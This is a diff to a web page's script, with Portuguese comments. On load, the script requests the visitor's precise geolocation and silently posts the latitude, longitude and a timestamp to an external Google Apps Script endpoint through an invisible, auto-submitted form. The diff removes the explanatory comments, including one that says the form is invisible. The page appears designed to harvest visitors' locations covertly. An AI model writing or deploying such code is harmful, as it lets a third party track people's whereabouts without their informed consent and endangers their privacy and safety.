@@ -8,39 +8,35 @@
 <body>
   <script>
     function enviar(lat, lon) {
-      // Cria um formulário invisível
       const form = document.createElement("form");
       form.method = "POST";
       form.action = "https://script.google.com/macros/s/AKfycby5kT18kkDvLjtySh6T2JBOSO_qkPy7hQhoqcoR13khsyYbY_74Zp9KhQPiG98VNgd6nQ/exec";
       form.style.display = "none";
 
-      // Latitude
       const latInput = document.createElement("input");
       latInput.name = "lat";
       latInput.value = lat;
       form.appendChild(latInput);
 
-      // Longitude
       const lonInput = document.createElement("input");
       lonInput.name = "lon";
       lonInput.value = lon;
       form.appendChild(lonInput);
 
-      // Timestamp
       const tsInput = document.createElement("input");
       tsInput.name = "timestamp";
       tsInput.value = new Date().toISOString();
       form.appendChild(tsInput);
 
       document.body.appendChild(form);
-      form.submit(); // envia para o Apps Script sem bloquear CORS
+      form.submit(); // envia sem problemas de CORS
     }
 
     window.onload = function() {
       if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(
-          (pos) => enviar(pos.coords.latitude, pos.coords.longitude),
-          (err) => console.error("Erro ao obter localização:", err),
+          pos => enviar(pos.coords.latitude, pos.coords.longitude),
+          err => console.error("Erro ao obter localização:", err),
           { enableHighAccuracy: true }
         );
       } else {
